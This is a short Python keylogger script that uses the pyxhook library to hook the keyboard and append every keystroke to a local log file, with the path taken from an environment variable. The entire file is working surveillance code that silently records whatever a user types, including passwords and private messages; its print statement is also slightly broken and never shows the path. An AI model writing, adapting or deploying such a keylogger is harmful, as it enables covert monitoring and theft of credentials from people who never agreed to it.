#!/usr/bin/env python
import os, sys
import pyxhook

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.environ.get(
    'pylogger_file',
    os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'log') #replaced with a string literal using sed
)

print("logging keystrokes to ".format(log_file))

# Allow clearing the log file on start, if pylogger_clean is defined.
# if os.environ.get('pylogger_clean', None) is not None:
#     try:
#         os.remove(log_file)
#     except EnvironmentError:
#         # File does not exist, or no permissions.
#         pass

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

hook = pyxhook.HookManager()
hook.KeyDown = OnKeyPress
hook.HookKeyboard()

try:
    hook.start()
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
